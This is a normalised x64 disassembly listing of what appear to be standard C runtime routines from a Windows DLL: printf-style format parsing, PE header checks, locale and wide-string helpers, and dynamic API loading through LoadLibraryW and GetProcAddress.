sub rsp 0x20
mov rdi r9
mov rsi r8
mov ebx edx
mov bpl cl
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
test ebx ebx
jg r-xdata
mov r8 rdi
mov rdx rsi
mov cl bpl
dec ebx
call sub_180025edc
cmp [ rdi ] 0xffffffff
je r-xdata
sub_180025f78
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
test [ r8 + 0x18 ] 0x40
mov rbx [ rsp + 0x60 ]
mov rdi r9
mov r12d [ rbx ]
mov rbp r8
mov esi edx
mov r13 rcx
je r-xdata
and [ rbx ] 0x0
test edx edx
jle r-xdata
cmp [ r8 + 0x10 ] 0x0
jne r-xdata
mov [ rbx ] r12d
mov cl [ r13 ]
mov r8 rdi
mov rdx rbp
dec esi
call sub_180025edc
inc r13
cmp [ rdi ] 0xffffffff
jne r-xdata
add [ r9 ] edx
jmp r-xdata
test esi esi
jg r-xdata
cmp [ rbx ] 0x2a
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
cmp [ rbx ] 0x0
jne r-xdata
mov r8 rdi
mov rdx rbp
mov cl 0x3f
call sub_180025edc
sub_180026010
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1d0 ]
sub rsp 0x2d0
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1c8 ] rax
xor eax eax
mov rbx rcx
mov [ rsp + 0x70 ] rcx
mov [ rsp + 0x68 ] rdx
lea rcx [ rbp - 0x80 ]
mov rdx r8
mov r15 r9
mov [ rsp + 0x64 ] eax
mov r13d eax
mov [ rsp + 0x58 ] eax
mov edi eax
mov [ rsp + 0x44 ] eax
mov [ rsp + 0x4c ] eax
mov [ rsp + 0x5c ] eax
mov [ rsp + 0x54 ] eax
call sub_180018cdc
call sub_1800194ec
xor r10d r10d
mov [ rbp - 0x60 ] rax
test rbx rbx
jne r-xdata
or r14d 0xffffffff
test [ rbx + 0x18 ] 0x40
lea r9 [ __dos_header ]
jne r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
je r-xdata
mov rdx [ rsp + 0x68 ]
test rdx rdx
je r-xdata
mov rcx rbx
call sub_180025cc4
lea rdx [ rw-data ]
cmp eax r14d
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
xor r11d r11d
cmp [ rbp - 0x68 ] r11b
mov r12b [ rdx ]
mov esi r10d
mov [ rsp + 0x40 ] r10d
mov [ rsp + 0x48 ] r10d
mov r8d r10d
mov [ rbp - 0x50 ] r10
test r12b r12b
je r-xdata
mov r8 rdx
lea r9 [ __dos_header ]
cmp eax 0xfffffffe
je r-xdata
mov rcx [ rbp + 0x1c8 ]
xor rcx rsp
call sub_180018450
mov rbx [ rsp + 0x320 ]
add rsp 0x2d0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r14d
jmp r-xdata
mov rax [ rbp - 0x70 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x68 ] r10b
je r-xdata
mov rbx [ rbp - 0x48 ]
mov r11d 0x200
cmp eax r14d
je r-xdata
movsxd r8 eax
lea r9 [ __dos_header ]
mov rcx r8
and r8d 0x1f
sar rcx 0x5
imul r8 r8 0x58
add r8 [ r9 + rcx * 8 + 0x3f720 ]
jmp r-xdata
mov eax esi
mov rcx [ rbp - 0x70 ]
and [ rcx + 0xc8 ] 0xfffffffd
test r8d r8d
je r-xdata
lea eax [ r12 - 0x20 ]
cmp al 0x58
ja r-xdata
test [ rdx + 0x38 ] 0x80
je r-xdata
cmp eax 0xfffffffe
je r-xdata
test [ r8 + 0x38 ] 0x7f
jne r-xdata
cmp r8d 0x7
jne r-xdata
mov ecx r10d
movsx rax r12b
movzx ecx [ rax + r9 + 0x30b50 ]
and ecx 0xf
jmp r-xdata
xor r10d r10d
movsxd rdx eax
mov rax rdx
and edx 0x1f
sar rax 0x5
imul rdx rdx 0x58
add rdx [ r9 + rax * 8 + 0x3f720 ]
mov ecx r8d
test r8d r8d
je r-xdata
movsxd rax ecx
lea rcx [ rax + rax * 8 ]
movsxd rax r8d
add rcx rax
movzx r8d [ rcx + r9 + 0x30b70 ]
shr r8d 0x4
mov [ rsp + 0x60 ] r8d
cmp r8d 0x8
je r-xdata
lea rdx [ rbp - 0x80 ]
movzx ecx r12b
mov [ rsp + 0x54 ] r10d
call sub_180024c7c
xor esi esi
test eax eax
je r-xdata
dec ecx
je r-xdata
mov rdx [ rsp + 0x70 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_180025edc
mov esi [ rsp + 0x40 ]
xor r10d r10d
jmp r-xdata
mov rdx [ rsp + 0x70 ]
lea r8 [ rsp + 0x40 ]
mov cl r12b
call sub_180025edc
mov rdx [ rsp + 0x68 ]
mov r12b [ rdx ]
inc rdx
mov [ rsp + 0x68 ] rdx
test r12b r12b
je r-xdata
mov [ rsp + 0x78 ] r10d
mov [ rsp + 0x5c ] r10d
mov [ rsp + 0x58 ] r10d
mov [ rsp + 0x4c ] r10d
mov r13d r10d
mov edi r14d
mov [ rsp + 0x44 ] r14d
mov [ rsp + 0x54 ] r10d
jmp r-xdata
dec ecx
je r-xdata
mov rdx [ rsp + 0x68 ]
mov r8d [ rsp + 0x60 ]
mov r11d 0x200
lea r9 [ __dos_header ]
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
cmp [ rbp - 0x68 ] sil
jmp r-xdata
mov r12b [ rdx ]
test r12b r12b
jne r-xdata
cmp r12b 0x20
je r-xdata
dec ecx
je r-xdata
inc rdx
mov [ rsp + 0x68 ] rdx
test esi esi
js r-xdata
je r-xdata
or r13d 0x2
jmp r-xdata
cmp r12b 0x23
je r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
bts r13d 0x7
jmp r-xdata
cmp r12b 0x2b
je r-xdata
mov eax [ rsp + 0x58 ]
lea ecx [ rax + rax * 4 ]
movsx eax r12b
lea eax [ rax + rcx * 2 - 0x30 ]
mov eax [ r15 ]
add r15 0x8
mov [ rsp + 0x58 ] eax
test eax eax
jns r-xdata
mov edi r10d
mov [ rsp + 0x44 ] r10d
jmp r-xdata
dec ecx
je r-xdata
or r13d 0x1
jmp r-xdata
cmp r12b 0x2d
je r-xdata
or r13d 0x4
neg eax
jmp r-xdata
cmp r12b 0x2a
jne r-xdata
dec ecx
je r-xdata
or r13d 0x4
jmp r-xdata
cmp r12b 0x30
jne r-xdata
mov [ rsp + 0x58 ] eax
jmp r-xdata
lea ecx [ rdi + rdi * 4 ]
movsx eax r12b
lea edi [ rax + rcx * 2 - 0x30 ]
mov [ rsp + 0x44 ] edi
jmp r-xdata
mov edi [ r15 ]
add r15 0x8
mov [ rsp + 0x44 ] edi
test edi edi
jns r-xdata
cmp r12b 0x49
je r-xdata
dec ecx
jne r-xdata
or r13d 0x8
jmp r-xdata
mov edi r14d
mov [ rsp + 0x44 ] r14d
jmp r-xdata
mov al [ rdx ]
bts r13d 0xf
cmp al 0x36
jne r-xdata
cmp r12b 0x68
je r-xdata
movsx eax r12b
cmp eax 0x64
jg r-xdata
cmp al 0x33
jne r-xdata
cmp [ rdx + 0x1 ] 0x34
jne r-xdata
or r13d 0x20
jmp r-xdata
cmp r12b 0x6c
je r-xdata
cmp eax 0x65
jl r-xdata
je r-xdata
cmp al 0x64
je r-xdata
cmp [ rdx + 0x1 ] 0x32
jne r-xdata
add rdx 0x2
bts r13d 0xf
jmp r-xdata
cmp [ rdx ] 0x6c
jne r-xdata
cmp r12b 0x77
jne r-xdata
cmp [ rsp + 0x5c ] r10d
jne r-xdata
cmp eax 0x67
jle r-xdata
or r13d 0x40
cmp eax 0x41
je r-xdata
cmp al 0x69
je r-xdata
add rdx 0x2
btr r13d 0xf
jmp r-xdata
or r13d 0x10
jmp r-xdata
inc rdx
bts r13d 0xc
jmp r-xdata
bts r13d 0xb
jmp r-xdata
mov rax [ rbp - 0x50 ]
test rax rax
je r-xdata
test r13b 0x40
je r-xdata
or r13d 0x40
lea rbx [ rbp - 0x40 ]
mov esi r11d
test edi edi
jns r-xdata
cmp eax 0x69
je r-xdata
mov r8 [ r15 ]
add r15 0x8
jmp r-xdata
bt r13d 0xc
jae r-xdata
mov [ rsp + 0x78 ] 0x1
add r12b 0x20
cmp eax 0x43
je r-xdata
cmp al 0x6f
je r-xdata
mov edi [ rsp + 0x44 ]
mov rcx rax
call sub_180018b3c
xor r10d r10d
mov [ rbp - 0x50 ] r10
mov edi [ rsp + 0x4c ]
bt r13d 0x8
jae r-xdata
jne r-xdata
mov [ rsp + 0x44 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
test r13b 0x40
je r-xdata
add r15 0x8
test r13b 0x20
je r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x45
je r-xdata
cmp al 0x75
je r-xdata
mov rax [ rbp - 0x60 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rsp + 0x50 ]
mov r8 rsi
mov edx edi
mov [ rsp + 0x20 ] rax
call sub_180025f78
test r13b 0x8
je r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x20
call sub_180025f24
test r13b 0x1
je r-xdata
mov [ rsp + 0x50 ] 0x2d
jmp r-xdata
cmp edi r11d
cmovg edi r11d
mov [ rsp + 0x44 ] edi
cmp edi 0xa3
jle r-xdata
cmp r12b 0x67
jne r-xdata
mov rax [ r15 ]
mov rcx [ rw-data ]
add r15 0x8
movsx edi r12b
movsxd rsi esi
mov [ rbp - 0x48 ] rax
call [ DecodePointer@IAT ]
lea rcx [ rbp - 0x80 ]
mov r9d edi
mov [ rsp + 0x30 ] rcx
mov ecx [ rsp + 0x78 ]
mov r8 rsi
mov [ rsp + 0x28 ] ecx
mov ecx [ rsp + 0x44 ]
mov rdx rbx
mov [ rsp + 0x20 ] ecx
lea rcx [ rbp - 0x48 ]
call rax
mov edi r13d
and edi 0x80
je r-xdata
mov rdi [ r15 ]
add r15 0x8
call sub_180025cec
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x6f
je r-xdata
test eax r13d
jne r-xdata
test r8 r8
jns r-xdata
test r13b 0x40
je r-xdata
test r13b 0x40
je r-xdata
add r15 0x8
test r13d 0x810
je r-xdata
bts r13d 0xb
cmp eax 0x47
je r-xdata
cmp al 0x78
je r-xdata
mov edi [ rsp + 0x48 ]
xor eax eax
cmp [ rsp + 0x54 ] eax
je r-xdata
test r13b 0x4
jne r-xdata
test r13b 0x2
je r-xdata
mov [ rsp + 0x50 ] 0x2b
mov edi 0x1
mov [ rsp + 0x4c ] edi
jmp r-xdata
add edi 0x15d
movsxd rcx edi
call sub_18001b71c
mov [ rbp - 0x50 ] rax
test rax rax
je r-xdata
mov [ rsp + 0x44 ] 0x1
jmp r-xdata
cmp r12b 0x67
jne r-xdata
xor eax eax
cmp [ rsp + 0x44 ] eax
jne r-xdata
test r13b 0x20
je r-xdata
mov r9d 0x8
test r13b r13b
jns r-xdata
cmp eax 0x70
je r-xdata
test edi edi
jns r-xdata
bt r13d 0xc
jb r-xdata
neg r8
bts r13d 0x8
mov r8d [ r15 - 0x8 ]
movsxd r8 [ r15 - 0x8 ]
jmp r-xdata
movzx r8d [ r15 - 0x8 ]
jmp r-xdata
movsx r8 [ r15 - 0x8 ]
jmp r-xdata
mov al [ r15 - 0x8 ]
mov [ rsp + 0x48 ] 0x1
mov [ rbp - 0x40 ] al
movzx r9d [ r15 - 0x8 ]
lea rdx [ rbp - 0x40 ]
lea rcx [ rsp + 0x48 ]
mov r8 r11
call sub_180025ec8
xor r10d r10d
test eax eax
je r-xdata
cmp eax 0x53
je r-xdata
cmp al 0x58
je r-xdata
mov rax [ rbp - 0x60 ]
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx edi
mov rcx rbx
mov [ rsp + 0x20 ] rax
call sub_180025f78
xor r10d r10d
test edi edi
jle r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rsi
mov edx r12d
mov cl 0x30
call sub_180025f24
mov [ rsp + 0x50 ] 0x20
jmp r-xdata
mov r12d [ rsp + 0x58 ]
mov rsi [ rsp + 0x70 ]
sub r12d [ rsp + 0x48 ]
sub r12d edi
test r13b 0xc
jne r-xdata
mov [ rsp + 0x44 ] 0xa3
mov rbx rax
mov esi edi
jmp r-xdata
cmp [ rbx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rdi ] esi
mov [ rdi ] si
jmp r-xdata
mov edx [ rsp + 0x4c ]
or r13d r11d
jmp r-xdata
mov edi 0x10
bts r13d 0xf
cmp eax 0x73
je r-xdata
and r13d 0xfffffff7
cmp edi r11d
cmovg edi r11d
mov edi 0x1
jmp r-xdata
mov r8d r8d
lea rbx [ rbp - 0x40 ]
jmp r-xdata
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
test r13d 0x830
jne r-xdata
cmp eax 0x58
je r-xdata
mov [ rsp + 0x60 ] r10d
test r13b 0x4
je r-xdata
mov rsi rbx
mov rcx rbx
call sub_180019aa0
mov esi [ rsp + 0x40 ]
bts r13d 0x8
inc rbx
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
lea rdx [ rbp - 0x80 ]
mov rcx rbx
call rax
mov [ rsp + 0x5c ] 0x1
jmp r-xdata
add al 0x51
mov [ rsp + 0x50 ] 0x30
lea edx [ r9 - 0xe ]
mov [ rsp + 0x51 ] al
jmp r-xdata
mov rbx [ r15 ]
cmp edi r14d
mov eax edi
mov ecx 0x7fffffff
cmove eax ecx
add r15 0x8
test r13d 0x810
je r-xdata
cmp eax 0x75
je r-xdata
xor edx edx
mov rax r8
movsxd rcx r9d
div rcx
mov r8 rax
lea eax [ rdx + 0x30 ]
cmp eax 0x39
jle r-xdata
test r8 r8
je r-xdata
mov esi [ rsp + 0x64 ]
mov rax r8
lea rbx [ rbp + 0x1bf ]
neg rax
sbb ecx ecx
and ecx edx
mov [ rsp + 0x4c ] ecx
bts r13d 0xb
mov eax 0x7
cmp eax 0x5a
je r-xdata
mov r8 [ rsp + 0x70 ]
lea r9 [ rsp + 0x40 ]
mov edx r12d
mov cl 0x20
call sub_180025f24
mov esi [ rsp + 0x40 ]
xor r10d r10d
mov esi r14d
mov [ rsp + 0x40 ] r14d
jmp r-xdata
mov edx [ rbp - 0x58 ]
test edx edx
je r-xdata
mov eax 0x8000
test eax r13d
jne r-xdata
test rbx rbx
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
test rbx rbx
mov [ rsp + 0x54 ] 0x1
cmove rbx [ rw-data ]
mov rcx rbx
jmp r-xdata
mov r9d 0xa
cmp eax 0x78
jne r-xdata
mov [ rbx ] al
dec rbx
jmp r-xdata
add eax esi
mov esi [ rsp + 0x40 ]
lea rax [ rbp + 0x1bf ]
mov [ rsp + 0x44 ] edi
sub eax ebx
inc rbx
mov [ rsp + 0x48 ] eax
test r11d r13d
je r-xdata
mov rax [ r15 ]
add r15 0x8
test rax rax
je r-xdata
cmp eax 0x61
je r-xdata
test esi esi
js r-xdata
mov rax [ rbp - 0x60 ]
mov r8 [ rsp + 0x70 ]
lea r9 [ rsp + 0x40 ]
lea rcx [ rbp + 0x1c0 ]
mov [ rsp + 0x20 ] rax
call sub_180025f78
xor r10d r10d
test edi edi
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov eax 0x27
jmp r-xdata
mov ecx edi
dec edi
test ecx ecx
jg r-xdata
test eax eax
je r-xdata
mov rbx [ rw-data ]
mov rcx rbx
call sub_180019aa0
jmp r-xdata
mov rbx [ rax + 0x8 ]
test rbx rbx
je r-xdata
cmp eax 0x63
je r-xdata
movzx r9d [ rsi ]
lea rdx [ rbp + 0x1c0 ]
lea rcx [ rbp - 0x58 ]
mov r8d 0x6
dec edi
add rsi 0x2
call sub_180025ec8
xor r10d r10d
test eax eax
jne r-xdata
jmp r-xdata
dec eax
cmp [ rcx ] r10b
je r-xdata
sub ecx ebx
dec eax
cmp [ rcx ] r10w
je r-xdata
sub rcx rbx
sar rcx 0x1
jmp r-xdata
mov [ rsp + 0x64 ] eax
mov r9d 0x10
test r13b r13b
jns r-xdata
dec rbx
inc [ rsp + 0x48 ]
mov [ rbx ] 0x30
jmp r-xdata
cmp [ rbx ] 0x30
je r-xdata
xor r10d r10d
movsx eax [ rax ]
bt r13d 0xb
jae r-xdata
jmp r-xdata
mov esi [ rsp + 0x40 ]
inc rcx
add rcx 0x2
mov [ rsp + 0x48 ] ecx
jmp r-xdata
mov [ rsp + 0x54 ] r10d
jmp r-xdata
cdq
mov [ rsp + 0x54 ] 0x1
sub eax edx
sar eax 0x1
jmp r-xdata
mov [ rsp + 0x48 ] eax
sub_180026ae0
mov [ rsp + 0x8 ] cx
push rbx
sub rsp 0x20
mov eax 0xffff
movzx ebx dx
cmp cx ax
jne r-xdata
mov eax 0x100
cmp cx ax
jae r-xdata
xor eax eax
jmp r-xdata
mov ecx 0x1
lea r9 [ rsp + 0x40 ]
lea rdx [ rsp + 0x30 ]
mov r8d ecx
call [ GetStringTypeW@IAT ]
xor ecx ecx
test eax eax
je r-xdata
mov rax [ rw-data ]
movzx ecx cx
movzx eax [ rax + rcx * 2 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
movzx eax cx
movzx ecx [ rsp + 0x40 ]
movzx ecx bx
and eax ecx
sub_180026bb0
mov rax rcx
mov ecx 0x5a4d
cmp [ rax ] cx
je r-xdata
movsxd rcx [ rax + 0x3c ]
add rcx rax
xor eax eax
cmp [ rcx ] 0x4550
jne r-xdata
xor eax eax
retn
retn
mov edx 0x20b
cmp [ rcx + 0x18 ] dx
sete al
sub_180026be0
movsxd r8 [ rcx + 0x3c ]
xor r9d r9d
mov r10 rdx
add r8 rcx
movzx eax [ r8 + 0x14 ]
movzx r11d [ r8 + 0x6 ]
lea rcx [ rax + r8 + 0x18 ]
test r11d r11d
je r-xdata
xor eax eax
retn
mov edx [ rcx + 0xc ]
cmp r10 rdx
jb r-xdata
inc r9d
add rcx 0x28
cmp r9d r11d
jb r-xdata
mov eax [ rcx + 0x8 ]
add eax edx
cmp r10 rax
jb r-xdata
mov rax rcx
retn
sub_180026c30
sub rsp 0x28
mov r8 rcx
lea r9 [ __dos_header ]
mov rcx r9
call sub_180026bb0
test eax eax
je r-xdata
add rsp 0x28
retn
sub r8 r9
mov rdx r8
mov rcx r9
call sub_180026be0
test rax rax
je r-xdata
mov eax [ rax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
jmp r-xdata
sub_180026c7c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x40
mov ebx edx
mov rdx rcx
lea rcx [ rsp + 0x20 ]
mov edi r9d
mov esi r8d
call sub_180018cdc
mov rax [ rsp + 0x28 ]
movzx r11d bl
test [ r11 + rax + 0x1d ] dil
jne r-xdata
mov eax 0x1
test esi esi
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
add rsp 0x40
pop rdi
retn
mov rcx [ rsp + 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
xor eax eax
mov rax [ rsp + 0x20 ]
mov rcx [ rax + 0x140 ]
movzx eax [ rcx + r11 * 2 ]
and eax esi
jmp r-xdata
cmp [ rsp + 0x38 ] 0x0
je r-xdata
test eax eax
je r-xdata
sub_180026d0c
push rbp
push r12
push r13
push r14
push r15
sub rsp 0x50
lea rbp [ rsp + 0x40 ]
mov [ rbp + 0x40 ] rbx
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x50 ] rdi
mov rax [ rw-data ]
xor rax rbp
mov [ rbp ] rax
mov rax [ rcx ]
mov r13d r8d
mov r14d edx
mov r12d [ rax + 0x4 ]
mov r15 r9
xor r8d r8d
xor r9d r9d
mov edx r13d
mov ecx r14d
xor edi edi
call [ GetLocaleInfoW@IAT ]
movsxd rsi eax
test eax eax
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov rbx rdi
xor edx edx
lea rax [ rdx - 0x20 ]
div rsi
cmp rax 0x2
jb r-xdata
mov rcx [ rbp ]
xor rcx rbp
call sub_180018450
mov rbx [ rbp + 0x40 ]
mov rsi [ rbp + 0x48 ]
mov rdi [ rbp + 0x50 ]
lea rsp [ rbp + 0x10 ]
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov r9d esi
mov r8 rbx
mov edx r13d
mov ecx r14d
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
lea rcx [ rsi + rsi + 0x10 ]
cmp rcx 0x400
ja r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov eax [ rbp + 0x60 ]
or r9d 0xffffffff
xor edx edx
mov [ rsp + 0x38 ] rdi
mov r8 rbx
mov ecx r12d
mov [ rsp + 0x30 ] rdi
test eax eax
jne r-xdata
call sub_18001b358
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov eax edi
call sub_180018b3c
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r15
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
jmp r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180023d20
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
call [ WideCharToMultiByte@IAT ]
mov edi eax
mov [ rbx ] 0xcccc
jmp r-xdata
add rbx 0x10
jmp r-xdata
sub_180026e64
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x50
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x30 ]
mov rbx r9
mov edi r8d
call sub_180018cdc
mov r11d [ rsp + 0x80 ]
lea rcx [ rsp + 0x30 ]
mov r9 rbx
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] r11d
call sub_180026d0c
cmp [ rsp + 0x48 ] 0x0
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180026ecc
push rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x48 ] rax
mov ebp r8d
mov r14 rdx
mov r13 rcx
call EncodePointer
xor ebx ebx
cmp [ rw-data ] rbx
mov rdi rax
jne r-xdata
mov rax [ rw-data ]
lea rcx [ r--data ]
call [ LoadLibraryW@IAT ]
mov rsi rax
test rax rax
je r-xdata
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
cmp r11 rdi
je r-xdata
xor eax eax
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
je r-xdata
mov rcx [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
mov rcx rax
call [ DecodePointer@IAT ]
mov rcx [ rw-data ]
mov rsi rax
call [ DecodePointer@IAT ]
mov r12 rax
test rsi rsi
je r-xdata
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov r11 rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov r9d ebp
mov r8 r14
mov rdx r13
mov rcx rbx
call rax
jmp r-xdata
call rax
mov rbx rax
test rax rax
je r-xdata
test rax rax
je r-xdata
mov rax [ rw-data ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_180018450
add rsp 0x50
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
call rsi
test rax rax
je r-xdata
cmp rax rdi
je r-xdata
mov r11 [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
bts ebp 0x15
jmp r-xdata
lea rcx [ rsp + 0x30 ]
mov r9d 0xc
lea r8 [ rsp + 0x38 ]
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0xb ]
mov rcx rax
call r12
test eax eax
je r-xdata
mov rcx rbx
call rax
mov rbx rax
test [ rsp + 0x40 ] 0x1
jne r-xdata
sub_1800270d4
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_1800194ec
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] r10w
je r-xdata
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
add rcx 0x2
dec rdx
jne r-xdata
sub rcx r8
mov [ r9 ] r10w
jmp r-xdata
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_18001dab4
mov eax ebx
sub_180027178
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_1800194ec
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
sub rcx r8
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_1800194ec
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_18001dab4
mov eax ebx
sub_1800271e4
sub rsp 0x28
test ecx ecx
js r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
add rsp 0x28
retn
mov eax [ rw-data ]
jmp r-xdata
sub_180027224
mov r9 rcx
movzx ecx [ rdx ]
inc rdx
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
add r8d 0x20
test r8d r8d
je r-xdata
add ecx 0x20
sub r8d ecx
mov eax r8d
retn
cmp r8d ecx
je r-xdata
movzx r8d [ r9 ]
inc r9
lea eax [ r8 - 0x41 ]
cmp eax 0x19
ja r-xdata
sub_180027260
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x40
mov rsi rcx
mov rdi rdx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_180018cdc
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub rsi rdi
mov rdx rdi
mov rcx rsi
call sub_180027224
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x40
pop rbp
retn
sub ebx eax
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp ebx eax
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx ecx [ rsi + rdi ]
lea rdx [ rbp - 0x20 ]
call sub_18001d160
movzx ecx [ rdi ]
lea rdx [ rbp - 0x20 ]
mov ebx eax
call sub_18001d160
inc rdi
test ebx ebx
je r-xdata
sub_180027338
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor r8d r8d
add rsp 0x28
jmp sub_180027260
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_1800194ec
mov [ rax ] 0x16
call sub_18001dab4
mov eax 0x7fffffff
add rsp 0x28
retn
add rsp 0x28
jmp sub_180027224
sub_18002738c
mov r10 rcx
test r8 r8
je r-xdata
xor eax eax
retn
movzx r9d [ r10 ]
inc r10
lea eax [ r9 - 0x41 ]
cmp eax 0x19
